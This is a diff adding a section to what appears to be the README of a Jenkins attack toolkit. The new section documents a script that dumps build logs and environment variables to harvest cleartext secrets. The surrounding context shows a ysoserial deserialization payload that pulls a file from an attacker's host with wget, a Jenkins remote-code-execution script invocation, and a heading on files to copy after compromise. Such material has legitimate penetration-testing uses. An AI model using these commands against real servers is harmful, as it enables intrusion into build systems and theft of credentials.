@@ -18,6 +18,25 @@ java -jar ysoserial-master.jar CommonsCollections1 'wget myip:myport -O /tmp/a.s
 ./jenkins_rce.py jenkins_ip jenkins_port payload.out
 ```
 
+Dumping builds to find cleartext secrets
+========================================
+Use [this script](./dump_builds/jenkins_dump_builds.py) to dump build console outputs and build environment variables to hopefully find cleartext secrets.
+
+```
+usage: jenkins_dump_builds.py [-h] -U URL [-u USER] [-p PASSWORD]
+                              [-o OUTPUT_DIR] [-d] [-f]
+
+Dump all available info from Jenkins
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -U URL, --url URL
+  -u USER, --user USER
+  -p PASSWORD, --password PASSWORD
+  -o OUTPUT_DIR, --output-dir OUTPUT_DIR
+  -d, --downgrade_ssl   Downgrade SSL to use RSA
+  -f, --full            Dump all available builds
+```
 
 Files to copy after compromission
 =================================
